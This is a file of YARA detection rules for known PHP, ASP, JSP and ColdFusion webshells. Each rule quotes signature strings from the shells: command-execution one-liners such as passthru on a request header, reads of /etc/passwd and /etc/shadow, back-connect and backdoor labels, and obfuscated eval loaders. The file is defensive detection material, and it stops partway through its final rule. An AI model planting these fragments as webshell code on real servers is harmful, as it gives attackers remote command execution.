rule SSC_WebShell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend {
meta:
description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
author = "Florian Roth"
hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
strings:
$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
$s19 = "$Comments=$_POST['Comments'];" fullword
$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword
condition:
3 of them
}
rule SSC_multiple_webshells_0002 {
meta:
description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_nst_php_php_img_php_php_nstview_php_php"
hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
hash2 = "4745d510fed4378e4b1730f56f25e569"
strings:
$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"
condition:
1 of them
}
rule SSC_EditServer_Webshell_2 {
meta:
description = "Webshells Auto-generated - file EditServer.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
strings:
$s0 = "@HOTMAIL.COM"
$s1 = "Press Any Ke"
$s3 = "glish MenuZ"
condition:
all of them
}
rule SSC_Antichat_Shell_v1_3_php {
meta:
description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "40d0abceba125868be7f3f990f031521"
strings:
$s0 = "Antichat"
$s1 = "Can't open file, permission denide"
$s2 = "$ra44"
condition:
2 of them
}
rule SSC_elmaliseker_asp {
meta:
description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "b32d1730d23a660fd6aa8e60c3dc549f"
strings:
$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
$s2 = "dim zombie_array,special_array"
$s3 = "http://vnhacker.org"
condition:
1 of them
}
rule SSC_WebShell_h4ntu_shell__powered_by_tsoi_ {
meta:
description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
author = "Florian Roth"
hash = "cbca8cd000e705357e2a7e0cf8262678706f18f9"
strings:
$s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
$s13 = "$cmd = $_POST['cmd'];" fullword
$s16 = "$uname = posix_uname( );" fullword
$s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
$s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
$s20 = "ob_end_clean();" fullword
condition:
3 of them
}
rule SSC_FSO_s_remview_2 {
meta:
description = "Webshells Auto-generated - file remview.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b4a09911a5b23e00b55abe546ded691c"
strings:
$s0 = "<xmp>$out</"
$s1 = ".mm(\"Eval PHP code\")."
condition:
all of them
}
rule SSC_vanquish_2 {
meta:
description = "Webshells Auto-generated - file vanquish.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "2dcb9055785a2ee01567f52b5a62b071"
strings:
$s2 = "Vanquish - DLL injection failed:"
condition:
all of them
}
rule SSC_ironshell_php {
meta:
description = "Semi-Auto-generated  - file ironshell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "8bfa2eeb8a3ff6afc619258e39fded56"
strings:
$s0 = "www.ironwarez.info"
$s1 = "$cookiename = \"wieeeee\";"
$s2 = "~ Shell I"
$s3 = "www.rootshell-team.info"
$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"
condition:
1 of them
}
rule SSC_webshell_zacosmall {
meta:
description = "Web Shell - file zacosmall.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "5295ee8dc2f5fd416be442548d68f7a6"
strings:
$s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>"
condition:
all of them
}
rule SSC_WebShell_accept_language {
meta:
description = "PHP Webshells Github Archive - file accept_language.php"
author = "Florian Roth"
hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
strings:
$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword
condition:
all of them
}
rule SSC_cfm_shell : webshell {
meta:
description = "Laudanum Injector Tools - file shell.cfm"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "885e1783b07c73e7d47d3283be303c9719419b92"
strings:
$s1 = "Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "<cfif ( #suppliedCode# neq secretCode )>" fullword ascii /* PEStudio Blacklist: strings */
$s3 = "<cfif IsDefined(\"form.cmd\")>" fullword ascii
condition:
filesize < 20KB and 2 of them
}
rule SSC_vanquish {
meta:
description = "Webshells Auto-generated - file vanquish.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "684450adde37a93e8bb362994efc898c"
strings:
$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"
condition:
all of them
}
rule SSC_webshell_webshells_new_aaa {
meta:
description = "Web shells - generated from file aaa.asp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "68483788ab171a155db5266310c852b2"
strings:
$s0 = "Function fvm(jwv):If jwv=\"\"Then:fvm=jwv:Exit Function:End If:Dim tt,sru:tt=\""
$s5 = "<option value=\"\"DROP TABLE [jnc];exec mast\"&kvp&\"er..xp_regwrite 'HKEY_LOCAL"
$s17 = "if qpv=\"\" then qpv=\"x:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\"&br&"
condition:
1 of them
}
rule SSC_HYTop2006_rar_Folder_2006X2 {
meta:
description = "Webshells Auto-generated - file 2006X2.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "cc5bf9fc56d404ebbc492855393d7620"
strings:
$s2 = "Powered By "
$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."
condition:
all of them
}
rule SSC_regshell {
meta:
description = "Webshells Auto-generated - file regshell.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "db2fdc821ca6091bab3ebd0d8bc46ded"
strings:
$s0 = "Changes the base hive to HKEY_CURRENT_USER."
$s4 = "Displays a list of values and sub-keys in a registry Hive."
$s5 = "Enter a menu selection number (1 - 3) or 99 to Exit: "
condition:
all of them
}
rule SSC_multiple_webshells_0026 {
meta:
description = "Semi-Auto-generated  - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_Crystal_php_nshell_php_php_load_shell_php_php"
hash0 = "fdbf54d5bf3264eb1c4bff1fac548879"
hash1 = "4a44d82da21438e32d4f514ab35c26b6"
hash2 = "0c5d227f4aa76785e4760cdcff78a661"
strings:
$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
$s1 = "$dires = $dires . $directory;" fullword
$s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword
condition:
2 of them
}
rule SSC_webshell_asp_dabao {
meta:
description = "Web Shell - file dabao.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "3919b959e3fa7e86d52c2b0a91588d5d"
strings:
$s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
$s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"
condition:
all of them
}
rule SSC_sh_php_php {
meta:
description = "Semi-Auto-generated  - file sh.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "330af9337ae51d0bac175ba7076d6299"
strings:
$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"
condition:
1 of them
}
rule SSC_sig_2005Gray {
meta:
description = "Webshells Auto-generated - file 2005Gray.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "75dbe3d3b70a5678225d3e2d78b604cc"
strings:
$s0 = "SCROLLBAR-FACE-COLOR: #e8e7e7;"
$s4 = "echo \"&nbsp;<a href=\"\"/\"&encodeForUrl(theHref,false)&\"\"\" target=_blank>\"&replace"
$s8 = "theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\"),2)"
$s9 = "SCROLLBAR-3DLIGHT-COLOR: #cccccc;"
condition:
all of them
}
rule SSC_bin_Client {
meta:
description = "Webshells Auto-generated - file Client.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "5f91a5b46d155cacf0cc6673a2a5461b"
strings:
$s0 = "Recieved respond from server!!"
$s4 = "packet door client"
$s5 = "input source port(whatever you want):"
$s7 = "Packet sent,waiting for reply..."
condition:
all of them
}
rule SSC_adjustcr {
meta:
description = "Webshells Auto-generated - file adjustcr.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "17037fa684ef4c90a25ec5674dac2eb6"
strings:
$s0 = "$Info: This file is packed with the UPX executable packer $"
$s2 = "$License: NRV for UPX is distributed under special license $"
$s6 = "AdjustCR Carr"
$s7 = "ION\\System\\FloatingPo"
condition:
all of them
}
rule SSC_ASP_CmdAsp {
meta:
description = "Webshells Auto-generated - file CmdAsp.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "79d4f3425f7a89befb0ef3bafe5e332f"
strings:
$s2 = "' -- Read the output from our command and remove the temp file -- '"
$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
$s9 = "' -- create the COM objects that we will be using -- '"
condition:
all of them
}
rule SSC_webshell_php_backdoor {
meta:
description = "Web Shell - file php-backdoor.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
strings:
$s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
$s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
condition:
all of them
}
rule SSC_SimShell_1_0___Simorgh_Security_MGZ_php {
meta:
description = "Semi-Auto-generated  - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "37cb1db26b1b0161a4bf678a6b4565bd"
strings:
$s0 = "Simorgh Security Magazine "
$s1 = "Simshell.css"
$s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], "
$s3 = "www.simorgh-ev.com"
condition:
2 of them
}
rule SSC_WebShell_g00nshell_v1_3 {
meta:
description = "PHP Webshells Github Archive - file g00nshell-v1.3.php"
author = "Florian Roth"
hash = "70fe072e120249c9e2f0a8e9019f984aea84a504"
strings:
$s10 = "#To execute commands, simply include ?cmd=___ in the url. #" fullword
$s15 = "$query = \"SHOW COLUMNS FROM \" . $_GET['table'];" fullword
$s16 = "$uakey = \"724ea055b975621b9d679f7077257bd9\"; // MD5 encoded user-agent" fullword
$s17 = "echo(\"<form method='GET' name='shell'>\");" fullword
$s18 = "echo(\"<form method='post' action='?act=sql'>\");" fullword
condition:
2 of them
}
rule SSC_Nshell__1__php_php {
meta:
description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "973fc89694097a41e684b43a21b1b099"
strings:
$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
condition:
1 of them
}
rule SSC_WebShell_php_webshells_529 {
meta:
description = "PHP Webshells Github Archive - file 529.php"
author = "Florian Roth"
hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
strings:
$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
$s9 = "echo '<PRE><P>This is exploit from <a " fullword
$s10 = "This Exploit Was Edited By KingDefacer" fullword
$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
$s14 = "$hardstyle = explode(\"/\", $file); " fullword
$s20 = "while($level--) chdir(\"..\"); " fullword
condition:
2 of them
}
rule SSC_webshell_browser_201_3_400_in_JFolder_jfolder01_jsp_leo_ma_warn_webshell_nc_download {
meta:
description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, ma.jsp, warn.jsp, webshell-nc.jsp, download.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "37603e44ee6dc1c359feb68a0d566f76"
hash1 = "a7e25b8ac605753ed0c438db93f6c498"
hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
hash3 = "36331f2c81bad763528d0ae00edf55be"
hash4 = "793b3d0a740dbf355df3e6f68b8217a4"
hash5 = "8979594423b68489024447474d113894"
hash6 = "ec482fc969d182e5440521c913bab9bd"
hash7 = "f98d2b33cd777e160d1489afed96de39"
hash8 = "4b4c12b3002fad88ca6346a873855209"
hash9 = "4cc68fa572e88b669bce606c7ace0ae9"
hash10 = "e9a5280f77537e23da2545306f6a19ad"
hash11 = "598eef7544935cf2139d1eada4375bb5"
hash12 = "fa87bbd7201021c1aefee6fcc5b8e25a"
strings:
$s4 = "UplInfo info = UploadMonitor.getInfo(fi.clientFileName);" fullword
$s5 = "long time = (System.currentTimeMillis() - starttime) / 1000l;" fullword
condition:
all of them
}
rule SSC_WebShell_b374k_php {
meta:
description = "PHP Webshells Github Archive - file b374k.php.php"
author = "Florian Roth"
hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
strings:
$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
$s6 = "// password (default is: b374k)"
$s8 = "//******************************************************************************"
$s9 = "// b374k 2.2" fullword
$s10 = "eval(\"?>\".gzinflate(base64_decode("
condition:
3 of them
}
rule SSC_webshell_PHPJackal_v1_5 {
meta:
description = "Web Shell - file PHPJackal v1.5.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "d76dc20a4017191216a0315b7286056f"
strings:
$s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
$s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"
condition:
all of them
}
rule SSC_webshell_phpspy_2005_full_phpspy_2005_lite_PHPSPY {
meta:
description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, PHPSPY.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "b68bfafc6059fd26732fa07fb6f7f640"
hash1 = "42f211cec8032eb0881e87ebdb3d7224"
hash2 = "0712e3dc262b4e1f98ed25760b206836"
strings:
$s6 = "<input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['comma"
$s7 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILE"
$s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; "
condition:
2 of them
}
rule SSC_Unpack_TBack {
meta:
description = "Webshells Auto-generated - file TBack.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "a9d1007823bf96fb163ab38726b48464"
strings:
$s5 = "\\final\\new\\lcc\\public.dll"
condition:
all of them
}
rule SSC_phpshell {
meta:
description = "Webshells Auto-generated - file phpshell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "1dccb1ea9f24ffbd085571c88585517b"
strings:
$s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
$s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
$s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "
condition:
all of them
}
rule SSC_WebShell__findsock_php_findsock_shell_php_reverse_shell {
meta:
description = "PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php"
author = "Florian Roth"
super_rule = 1
hash0 = "5622c9841d76617bfc3cd4cab1932d8349b7044f"
hash1 = "4a20f36035bbae8e342aab0418134e750b881d05"
hash2 = "40dbdc0bdf5218af50741ba011c5286a723fa9bf"
strings:
$s1 = "// me at pentestmonkey@pentestmonkey.net" fullword
condition:
all of them
}
rule SSC_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html {
meta:
description = "Semi-Auto-generated  - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "8a8c8bb153bd1ee097559041f2e5cf0a"
strings:
$s0 = "Ayyildiz"
$s1 = "TouCh By iJOo"
$s2 = "First we check if there has been asked for a working directory"
$s3 = "http://ayyildiz.org/images/whosonline2.gif"
condition:
2 of them
}
rule SSC_webshell_ASP_tool {
meta:
description = "Web Shell - file tool.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "4ab68d38527d5834e9c1ff64407b34fb"
strings:
$s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
$s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
$s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"
condition:
2 of them
}
rule SSC_webadmin {
meta:
description = "Webshells Auto-generated - file webadmin.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "3a90de401b30e5b590362ba2dde30937"
strings:
$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"
condition:
all of them
}
rule SSC_php_include_w_shell_php {
meta:
description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "4e913f159e33867be729631a7ca46850"
strings:
$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"
condition:
1 of them
}
rule SSC_indexer_asp {
meta:
description = "Semi-Auto-generated  - file indexer.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "9ea82afb8c7070817d4cdf686abe0300"
strings:
$s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
$s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"
condition:
1 of them
}
rule SSC_FSO_s_remview {
meta:
description = "Webshells Auto-generated - file remview.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b4a09911a5b23e00b55abe546ded691c"
strings:
$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"
condition:
all of them
}
rule SSC_webshell_aZRaiLPhp_v1_0 {
meta:
description = "Web Shell - file aZRaiLPhp v1.0.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "26b2d3943395682e36da06ed493a3715"
strings:
$s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
$s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"
condition:
all of them
}
rule SSC_PHP_Shell_v1_7 {
meta:
description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b5978501c7112584532b4ca6fb77cba5"
strings:
$s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"
condition:
all of them
}
rule SSC_webshell_WinX_Shell {
meta:
description = "Web Shell - file WinX Shell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "17ab5086aef89d4951fe9b7c7a561dda"
strings:
$s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
$s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"
condition:
all of them
}
rule SSC_warfiles_cmd : webshell {
meta:
description = "Laudanum Injector Tools - file cmd.jsp"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "3ae3d837e7b362de738cf7fad78eded0dccf601f"
strings:
$s1 = "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii /* PEStudio Blacklist: strings */
$s2 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii /* PEStudio Blacklist: strings */
$s3 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
$s4 = "String disr = dis.readLine();" fullword ascii
condition:
filesize < 2KB and all of them
}
rule SSC_webshell_jsp_jdbc {
meta:
description = "Web Shell - file jdbc.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "23b0e6f91a8f0d93b9c51a2a442119ce"
strings:
$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
condition:
all of them
}
rule SSC_asp_file : webshell {
meta:
description = "Laudanum Injector Tools - file file.asp"
author = "Florian Roth"
reference = "http://laudanum.inguardians.com/"
date = "2015-06-22"
hash = "ff5b1a9598735440bdbaa768b524c639e22f53c5"
strings:
$s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
$s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
$s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii /* PEStudio Blacklist: strings */
$s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii /* PEStudio Blacklist: strings */
$s5 = "set folder = fso.GetFolder(path)" fullword ascii
$s6 = "Set file = fso.GetFile(filepath)" fullword ascii
condition:
uint16(0) == 0x253c and filesize < 30KB and 5 of them
}
rule SSC_WebShell_c99_madnet {
meta:
description = "PHP Webshells Github Archive - file c99_madnet.php"
author = "Florian Roth"
hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
strings:
$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
$s1 = "eval(gzinflate(base64_decode('"
$s2 = "$pass = \"pass\";  //Pass" fullword
$s3 = "$login = \"user\"; //Login" fullword
$s4 = "             //Authentication" fullword
condition:
all of them
}
rule SSC_webshell_c99_c99shell_c99_w4cking_Shell_xxx {
meta:
description = "Web Shell - from files c99.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, acid.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99.php, c99shell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
hash1 = "d3f38a6dc54a73d304932d9227a739ec"
hash2 = "9c34adbc8fd8d908cbb341734830f971"
hash3 = "f2fa878de03732fbf5c86d656467ff50"
hash4 = "b8f261a3cdf23398d573aaf55eaf63b5"
hash5 = "27786d1e0b1046a1a7f67ee41c64bf4c"
hash6 = "0f5b9238d281bc6ac13406bb24ac2a5b"
hash7 = "68c0629d08b1664f5bcce7d7f5f71d22"
hash8 = "157b4ac3c7ba3a36e546e81e9279eab5"
hash9 = "048ccc01b873b40d57ce25a4c56ea717"
strings:
$s0 = "echo \"<b>HEXDUMP:</b><nobr>"
$s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
$s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r"
$s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB "
$s8 = "echo \"<center><b>Server-status variables:</b><br>\";" fullword
$s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>"
condition:
2 of them
}
rule SSC_shelltools_g0t_root_xwhois {
meta:
description = "Webshells Auto-generated - file xwhois.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "0bc98bd576c80d921a3460f8be8816b4"
strings:
$s1 = "rting! "
$s2 = "aTypCog("
$s5 = "Diamond"
$s6 = "r)r=rQreryr"
condition:
all of them
}
rule SSC_HYTop_DevPack_2005 {
meta:
description = "Webshells Auto-generated - file 2005.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
strings:
$s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
$s8 = "scrollbar-darkshadow-color:#9C9CD3;"
$s9 = "scrollbar-face-color:#E4E4F3;"
condition:
all of them
}
rule SSC_webshell_c99_madnet_smowu {
meta:
description = "Web Shell - file smowu.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "3aaa8cad47055ba53190020311b0fb83"
strings:
$s0 = "//Authentication" fullword
$s1 = "$login = \"" fullword
$s2 = "eval(gzinflate(base64_decode('"
$s4 = "//Pass"
$s5 = "$md5_pass = \""
$s6 = "//If no pass then hash"
condition:
all of them
}
rule SSC_webshell_PHP_G5 {
meta:
description = "Web Shell - file G5.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "95b4a56140a650c74ed2ec36f08d757f"
strings:
$s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"
condition:
all of them
}
rule SSC_webshell_php_dodo_zip {
meta:
description = "Web Shell - file zip.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "b7800364374077ce8864796240162ad5"
strings:
$s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
$s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
condition:
all of them
}
rule SSC_Webshell_Insomnia {
meta:
description = "Insomnia Webshell - file InsomniaShell.aspx"
author = "Florian Roth"
reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
date = "2014/12/09"
hash = "e0cfb2ffaa1491aeaf7d3b4ee840f72d42919d22"
score = 80
strings:
$s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
$s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
$s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
$s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
$s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
$s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
$s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
$s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii
condition:
3 of them
}
rule SSC_FSO_s_EFSO_2_2 {
meta:
description = "Webshells Auto-generated - file EFSO_2.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "a341270f9ebd01320a7490c12cb2e64c"
strings:
$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
condition:
all of them
}
rule SSC_WebShell_Generic_PHP_6 {
meta:
description = "PHP Webshells Github Archive - from files c0derz shell [csh] v. 0.1.1 release.php, CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
author = "Florian Roth"
super_rule = 1
hash0 = "1a08f5260c4a2614636dfc108091927799776b13"
hash1 = "335a0851304acedc3f117782b61479bbc0fd655a"
